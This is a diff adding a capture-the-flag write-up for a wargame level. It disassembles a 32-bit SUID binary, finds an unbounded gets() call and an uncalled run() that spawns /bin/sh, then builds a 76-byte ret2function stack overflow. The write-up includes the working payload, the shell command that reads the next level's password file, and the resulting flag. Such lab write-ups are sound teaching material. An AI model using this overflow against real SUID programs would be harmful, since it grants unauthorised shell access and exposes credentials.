@@ -1,0 +1,110 @@
+# Level 1
+
+Binary: 32-bit ELF, SUID level2, dynamically linked.
+
+## Analysis
+
+### main
+
+```
+(gdb) disas main
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   <gets@plt>
+   0x08048495 <+21>:    leave
+   0x08048496 <+22>:    ret
+```
+
+main only calls `gets()` into a local buffer, then returns. No bounds checking. The buffer sits at `esp + 0x10` inside an 80-byte stack frame, so the buffer itself is 64 bytes (0x50 - 0x10).
+
+### Other functions
+
+Listed with `info functions`. I noticed a `run` function that main never calls:
+
+```
+0x08048444  run
+```
+
+Disassembling it:
+
+```asm
+call   <fwrite@plt>     ; arg = 0x8048570
+call   <system@plt>     ; arg = 0x8048584
+```
+
+Checking the strings:
+
+```
+(gdb) x/s 0x8048570
+0x8048570: "Good... Wait what?\n"
+(gdb) x/s 0x8048584
+0x8048584: "/bin/sh"
+```
+
+So `run()` calls `system("/bin/sh")` but is never reached in normal execution. It's dead code, perfect to redirect execution to.
+
+## Exploit
+
+Classic stack buffer overflow. Overwrite the return address with the address of `run()`.
+
+### Offset
+
+Buffer size: 64 bytes. Saved EBP: 4 bytes. Alignment padding (from `and $0xfffffff0,%esp` in the prologue): 8 bytes. Total to return address: 76 bytes.
+
+Verifying:
+
+```
+(gdb) run < <(python -c "print('A' * 76 + 'BBBB')")
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+EIP = 0x42424242, so offset 76 is correct.
+
+### Target address
+
+```
+(gdb) p run
+$1 = {<text variable, no debug info>} 0x8048444 <run>
+```
+
+In little-endian: `\x44\x84\x04\x08`.
+
+### Payload
+
+```
+76 bytes 'A' + address of run()
+```
+
+```bash
+$ (python -c "print('A' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+The `; cat` keeps stdin open after python finishes, so the spawned shell has input.
+
+Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
+
+## Notes
+
+This is a textbook **ret2function** exploit: `gets()` has no bounds check, so I can overflow past the return address. `run()` already contains `system("/bin/sh")`, no need for shellcode. ASLR off + no PIE means `run()`'s address is fixed. No stack canary, so the overflow isn't detected.
+
+NX doesn't block this: I'm not executing code on the stack, just jumping to code in the binary's `.text` section.
+
+### Stack diagram
+
+Before overflow:
+
+```
+[buffer (64 bytes)] [padding (8)] [saved EBP (4)] [return addr (4)]
+```
+
+After overflow:
+
+```
+[AAAA... 76 bytes of 'A' ...AAAA] [0x08048444]
+                                   → jumps to run()
+```
